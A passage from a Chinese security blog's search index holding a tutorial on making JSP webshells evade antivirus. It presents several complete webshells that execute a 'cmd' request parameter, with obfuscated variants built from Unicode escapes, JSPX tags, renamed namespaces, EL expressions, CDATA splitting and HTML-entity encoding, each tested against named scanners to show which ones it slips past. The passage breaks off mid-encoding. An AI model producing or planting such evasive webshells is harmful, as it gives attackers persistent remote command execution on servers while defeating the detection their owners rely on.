<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>webshell免杀之jsp</title>
    <link href="/2024/05/31/%E5%85%8D%E6%9D%80/webshell%E5%85%8D%E6%9D%80%E4%B9%8Bjsp/"/>
    <url>/2024/05/31/%E5%85%8D%E6%9D%80/webshell%E5%85%8D%E6%9D%80%E4%B9%8Bjsp/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><p>学了很多java的安全知识，但是突然想起来，打靶场中都是使用冰蝎生成的木马，而实战中，存在杀软的，我们上传的webshell连接不到几秒就杀了，甚至还没上传就被杀了，因此想学学java的webshell免杀。</p><h1 id="原始jsp："><a href="#原始jsp：" class="headerlink" title="原始jsp："></a>原始jsp：</h1><h2 id="基础webshell："><a href="#基础webshell：" class="headerlink" title="基础webshell："></a>基础webshell：</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%<span class="hljs-meta">@page</span> language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;utf-8&quot;</span> %&gt;<br><br><br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> process.getInputStream();<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span>((r = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        response.getWriter().println(r);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>运行成功后访问<code>?cmd=ls</code>：</p><p><img src="/../../blog_image/image-20240526134122236.png" alt="image-20240526134122236"></p><p>火绒落地杀：</p><p><img src="/../../blog_image/image-20240526134140511.png" alt="image-20240526134140511"></p><p>阿里云webshell查杀也是直接查出来了：</p><p><img src="/../../blog_image/image-20240526134312382.png" alt="image-20240526134312382"></p><p>主要的查杀点在于<code>Runtime.getRuntime().exec</code></p><h2 id="ProcessBuilder替换Runtime："><a href="#ProcessBuilder替换Runtime：" class="headerlink" title="ProcessBuilder替换Runtime："></a>ProcessBuilder替换Runtime：</h2><p>学过java的命令执行都知道，Runtime.getRuntime.exec最终调用的是ProcessBuilder，我们可以尝试替换看免杀效果：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%<span class="hljs-meta">@page</span> language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;utf-8&quot;</span> %&gt;<br><br><br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>    <span class="hljs-comment">// 读取运行内容</span><br>    <span class="hljs-comment">// 创建一个缓冲区并且写入缓冲区</span><br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> process.getInputStream();<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span>((r = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        response.getWriter().println(r);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>ProcessBuilder也是直接杀：</p><p><img src="/../../blog_image/image-20240526135335748.png" alt="image-20240526135335748"></p><p>但是vt是全绿的：</p><p><img src="/../../blog_image/image-20240526135512558.png" alt="image-20240526135512558"></p><p>d盾直接过：</p><p><img src="/../../blog_image/image-20240526135702248.png" alt="image-20240526135702248"></p><p>河马直接过：</p><p><img src="/../../blog_image/image-20240526140008014.png" alt="image-20240526140008014"></p><p>可能是阿里的webshell查杀，规则匹配比较厉害，当然后面会讲怎么绕过（字符绕过）。</p><h2 id="Expression免杀："><a href="#Expression免杀：" class="headerlink" title="Expression免杀："></a>Expression免杀：</h2><p>首先这里介绍什么是Expression。</p><p>java.beans.Expression，是java的el表达式。</p><blockquote><p>Express(Object value, Object target,String methodName,Object] arguments) 返回一个新的Exrpess对象。</p></blockquote><p>通过这个Expression可以调用该对象的getVaule()方法获取我们前面放置的值，然后再拿这个对象去调用。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.beans.Expression&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Expression</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd), <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) expr.getValue();<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span>((tmp = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        response.getWriter().println(tmp);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>阿里云一如既往的杀：</p><p><img src="/../../blog_image/image-20240526141138141.png" alt="image-20240526141138141"></p><p>河马不杀：</p><p><img src="/../../blog_image/image-20240526141152698.png" alt="image-20240526141152698"></p><p>d盾不杀：</p><p><img src="/../../blog_image/image-20240526141408715.png" alt="image-20240526141408715"></p><h1 id="编码绕过："><a href="#编码绕过：" class="headerlink" title="编码绕过："></a>编码绕过：</h1><h2 id="unicode编码："><a href="#unicode编码：" class="headerlink" title="unicode编码："></a>unicode编码：</h2><p>jsp是支持unicode编码的，我们可以将代码进行unicode编码，看能不能绕过查杀，这里使用最简单的，即Runtime的shell看会不会被杀：</p><p><img src="/../../blog_image/image-20240526142134025.png" alt="image-20240526142134025"></p><p>虽然报错，但是没关系的jsp会自动解析，也可以正常运行，如图所示：</p><p><img src="/../../blog_image/image-20240526142205647.png" alt="image-20240526142205647"></p><p>这里还可以使用前缀为<code>\uuuu00</code>：</p><p><img src="/../../blog_image/image-20240526142406881.png" alt="image-20240526142406881"></p><p>火绒不杀：</p><p><img src="/../../blog_image/image-20240526142633720.png" alt="image-20240526142633720"></p><p>阿里云还是杀了：</p><p><img src="/../../blog_image/image-20240526142729421.png" alt="image-20240526142729421"></p><p>d盾是存在可疑：</p><p><img src="/../../blog_image/image-20240526142855154.png" alt="image-20240526142855154"></p><h2 id="CDATA编码："><a href="#CDATA编码：" class="headerlink" title="CDATA编码："></a>CDATA编码：</h2><p>上面我们看到阿里云webshell查杀，会判断当前文件是否存在<code>%&gt;</code></p><p>我们将这个<code>%&gt;</code>删除后就显示正常文件，因此可以推断阿里云判断是webshell的一个主要特征是<code>%&gt;</code>。</p><p><img src="/../../blog_image/image-20240526143609336.png" alt="image-20240526143609336"></p><p>但是jsp中不将这个闭合，是不能解析的，因此这里尝试使用CDATA特性：</p><p>jspx其实就是xml格式的jsp文件</p><p>在jspx中，可以利用<a href="jsp:scriptlet">jsp:scriptlet</a>来代替&lt;%%&gt;</p><h3 id="jsp的一些小知识："><a href="#jsp的一些小知识：" class="headerlink" title="jsp的一些小知识："></a>jsp的一些小知识：</h3><h4 id="scriptlet标签："><a href="#scriptlet标签：" class="headerlink" title="scriptlet标签："></a>scriptlet标签：</h4><p>代码如图所示：</p><p><code>shell.jspx</code>如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span><br>          xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span><br>          version=<span class="hljs-string">&quot;1.2&quot;</span>&gt;<br>    &lt;jsp:directive.page contentType=<span class="hljs-string">&quot;text/html&quot;</span> pageEncoding=<span class="hljs-string">&quot;gb2312&quot;</span>/&gt;<br>    &lt;jsp:directive.page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>/&gt;<br><br>    &lt;html&gt;<br>    &lt;head&gt;<br>        &lt;title&gt;jspx&lt;/title&gt;<br>    &lt;/head&gt;<br>    &lt;body&gt;<br>    &lt;jsp:scriptlet&gt;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> child.getInputStream();<br>                <span class="hljs-type">int</span> c;<br>                <span class="hljs-keyword">while</span> ((c = in.read()) != -<span class="hljs-number">1</span>) &#123;<br>                    out.print((<span class="hljs-type">char</span>)c);<br>                &#125;<br>                in.close();<br>                <span class="hljs-keyword">try</span> &#123;<br>                    child.waitFor();<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            System.err.println(e);<br>        &#125;<br>    &lt;/jsp:scriptlet&gt;<br>    &lt;/body&gt;<br>    &lt;/html&gt;<br>&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><p>或者这样子写：</p><p><code>shell.jsp</code>内容如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%<span class="hljs-meta">@page</span> language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;utf-8&quot;</span> %&gt;<br><br>&lt;jsp:scriptlet&gt;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>  <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>  <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> process.getInputStream();<br>  <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>  <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">while</span>((r = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>    response.getWriter().println(r);<br>  &#125;<br>&lt;/jsp:scriptlet&gt;<br></code></pre></td></tr></table></figure><p>两者都可以运行：</p><p><img src="/../../blog_image/image-20240526144734277.png" alt="image-20240526144734277"></p><p>如果直接这样子写，Runtime特征会被识别出来：</p><p><img src="/../../blog_image/image-20240526144833464.png" alt="image-20240526144833464"></p><p>因此我们可以结合<code>unicode编码</code>+<code>jsp:script</code>标签绕过：</p><p><img src="/../../blog_image/image-20240526144940714.png" alt="image-20240526144940714"></p><p>好吧，阿里云还是杀了：</p><p><img src="/../../blog_image/image-20240526145038925.png" alt="image-20240526145038925"></p><p>但我们不写webshell，阿里云是不杀的，因此可以判断不杀这个标签的问题，而是unicode被杀了：</p><p><img src="/../../blog_image/image-20240526145326292.png" alt="image-20240526145326292"></p><h4 id="expression标签绕过："><a href="#expression标签绕过：" class="headerlink" title="expression标签绕过："></a>expression标签绕过：</h4><p><img src="/../../blog_image/image-20240526152726501.png" alt="image-20240526152726501"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">利用<span class="hljs-tag">&lt;<span class="hljs-name">jsp:expression</span>&gt;</span>绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">jsp:root</span> <span class="hljs-attr">xmlns:bbb</span>=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span>  <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.2&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">jsp:expression</span>&gt;</span><br>   Runtime.getRuntime().exec(pageContext.request.getParameter(&quot;cmd&quot;));<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">jsp:expression</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">jsp:root</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="命名空间绕过："><a href="#命名空间绕过：" class="headerlink" title="命名空间绕过："></a>命名空间绕过：</h4><p>在<code>jsp:scriptlet</code>是默认的命名空间，但是实际上可以随意替换成其他名字。</p><p>这个标签<code>bb</code>要和<code>xmlns:</code>的bb一致。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;bb:root version=<span class="hljs-string">&quot;1.2&quot;</span> xmlns:bb=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span>&gt;<br>    &lt;bb:scriptlet&gt;<br>        Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &lt;/bb:scriptlet&gt;<br>&lt;/bb:root&gt;<br></code></pre></td></tr></table></figure><p>但这样子写不会输出内容，实际上是运行了：</p><p><img src="/../../blog_image/image-20240526151803760.png" alt="image-20240526151803760"></p><p>尝试使用命令空间+unicode编码，虽然可以成功解析，但是还是被阿里云杀：<br><img src="/../../blog_image/image-20240526153238581.png" alt="image-20240526153238581"></p><h4 id="el表达式绕过："><a href="#el表达式绕过：" class="headerlink" title="el表达式绕过："></a>el表达式绕过：</h4><p>sp是默认解析el表达式的，并且在没有jsp标签的情况下也可以直接执行，这样就可以绕过jsp的限制。</p><p>如：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;Runtime.getRuntime.exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240526151251090.png" alt="image-20240526151251090"></p><h3 id="CDATA免杀实际案例："><a href="#CDATA免杀实际案例：" class="headerlink" title="CDATA免杀实际案例："></a>CDATA免杀实际案例：</h3><p>CDATA -（未解析）字符数据</p><p>术语 CDATA 是不应该由 XML 解析器解析的文本数据。</p><p>像<code>&lt;</code>和<code>&amp;</code>字符在XML元素中都是非法的。</p><p><code>&lt;</code>会产生错误，因为解析器会把该字符解释为新元素的开始。</p><p><code>&amp;</code>会产生错误，因为解析器会把该字符解释为字符实体的开始。</p><p>某些文本，比如JavaScript 代码，包含大量”&lt;”或”&amp;”字符。为了避免错误，可以将脚本代码定义为CDATA。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由<code>&quot;&lt;![CDATA[&quot; 开始，由&quot;]]&gt;&quot;</code>结束:</p><blockquote><p>说人话就是<![CDATA[ 与 ]]>只要能配对就相互抵消，其他不变，因此就可以说多了一个混淆的方式，有点类似多行注释在一行中使用（sql注入绕过waf），但是这个特征可以将关键字，函数进行分割，让其能混淆的空间变的更大</p></blockquote><p>因此我们可以使用<code>&lt;![DATA[这里写拼接的数据]]&gt;</code>进行绕过：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span><br>          version=<span class="hljs-string">&quot;2.0&quot;</span>&gt;<br>  &lt;jsp:directive.page contentType=<span class="hljs-string">&quot;text/html&quot;</span>/&gt;<br>  &lt;jsp:scriptlet&gt;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> requ&lt;![CDATA[est.get]]&gt;Parameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>  <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Ru&lt;![CDATA[ntime.getRunt]]&gt;ime().exec(cmd);<br>  java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> process.getInputStream();<br>  java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(is));<br>  <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">while</span>((r = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>    response.getWriter().println(r);<br>  &#125;<br>&lt;/jsp:scriptlet&gt;<br>&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><p>阿里云还是绕不过，虽然没有高亮标红，但是还是被识别成恶意了。</p><p><img src="/../../blog_image/image-20240526155542416.png" alt="image-20240526155542416"></p><p>但是可以绕过火绒：</p><p><img src="/../../blog_image/image-20240526154155092.png" alt="image-20240526154155092"></p><h2 id="HTML编码："><a href="#HTML编码：" class="headerlink" title="HTML编码："></a>HTML编码：</h2><p>将其他字符进行html编码，然后<code>&lt;!CDATA[]&gt;</code>的内容不需要编码，如图所示：</p><p>这个html编码，我是用工具后和生成的一样，但是需要注意排版，不如会报错：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span><br>          version=<span class="hljs-string">&quot;2.0&quot;</span>&gt;<br>    &lt;jsp:directive.page contentType=<span class="hljs-string">&quot;text/html&quot;</span>/&gt;<br>    &lt;jsp:scriptlet&gt;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> requ&lt;![CDATA[est.get]]&gt;Parameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>  &amp;#x50;&amp;#x72;&amp;#x6F;&amp;#x63;&amp;#x65;&amp;#x73;&amp;#x73;&amp;#x20;&amp;#x70;&amp;#x72;&amp;#x6F;&amp;#x63;&amp;#x65;&amp;#x73;&amp;#x73;&amp;#x20;&amp;#x3D;&amp;#x20;&amp;#x52;&amp;#x75;&lt;![CDATA[ntime.getRunt]]&gt;&amp;#x69;&amp;#x6D;&amp;#x65;&amp;#x28;&amp;#x29;&amp;#x2E;&amp;#x65;&amp;#x78;&amp;#x65;&amp;#x63;&amp;#x28;&amp;#x63;&amp;#x6D;&amp;#x64;&amp;#x29;&amp;#x3B;<br>&amp;#x20;&amp;#x20;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2E;&amp;#x49;&amp;#x6E;&amp;#x70;&amp;#x75;&amp;#x74;&amp;#x53;&amp;#x74;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x6D;&amp;#x20;&amp;#x69;&amp;#x73;&amp;#x20;&amp;#x3D;&amp;#x20;&amp;#x70;&amp;#x72;&amp;#x6F;&amp;#x63;&amp;#x65;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x67;&amp;#x65;&amp;#x74;&amp;#x49;&amp;#x6E;&amp;#x70;&amp;#x75;&amp;#x74;&amp;#x53;&amp;#x74;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x6D;&amp;#x28;&amp;#x29;&amp;#x3B;<br>&amp;#x20;&amp;#x20;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2E;&amp;#x42;&amp;#x75;&amp;#x66;&amp;#x66;&amp;#x65;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x52;&amp;#x65;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x20;&amp;#x62;&amp;#x75;&amp;#x66;&amp;#x66;&amp;#x65;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x52;&amp;#x65;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x20;&amp;#x3D;&amp;#x20;&amp;#x6E;&amp;#x65;&amp;#x77;&amp;#x20;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2E;&amp;#x42;&amp;#x75;&amp;#x66;&amp;#x66;&amp;#x65;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x52;&amp;#x65;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x28;&amp;#x6E;&amp;#x65;&amp;#x77;&amp;#x20;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2E;&amp;#x49;&amp;#x6E;&amp;#x70;&amp;#x75;&amp;#x74;&amp;#x53;&amp;#x74;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x6D;&amp;#x52;&amp;#x65;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x28;&amp;#x69;&amp;#x73;&amp;#x29;&amp;#x29;&amp;#x3B;<br>&amp;#x20;&amp;#x20;&amp;#x53;&amp;#x74;&amp;#x72;&amp;#x69;&amp;#x6E;&amp;#x67;&amp;#x20;&amp;#x72;&amp;#x20;&amp;#x3D;&amp;#x20;&amp;#x6E;&amp;#x75;&amp;#x6C;&amp;#x6C;&amp;#x3B;<br>&amp;#x20;&amp;#x20;&amp;#x77;&amp;#x68;&amp;#x69;&amp;#x6C;&amp;#x65;&amp;#x28;&amp;#x28;&amp;#x72;&amp;#x20;&amp;#x3D;&amp;#x20;&amp;#x62;&amp;#x75;&amp;#x66;&amp;#x66;&amp;#x65;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x52;&amp;#x65;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x2E;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x64;&amp;#x4C;&amp;#x69;&amp;#x6E;&amp;#x65;&amp;#x28;&amp;#x29;&amp;#x29;&amp;#x21;&amp;#x3D;&amp;#x6E;&amp;#x75;&amp;#x6C;&amp;#x6C;&amp;#x29;&amp;#x7B;<br>&amp;#x20;&amp;#x20;&amp;#x20;&amp;#x20;&amp;#x72;&amp;#x65;&amp;#x73;&amp;#x70;&amp;#x6F;&amp;#x6E;&amp;#x73;&amp;#x65;&amp;#x2E;&amp;#x67;&lt;![CDATA[e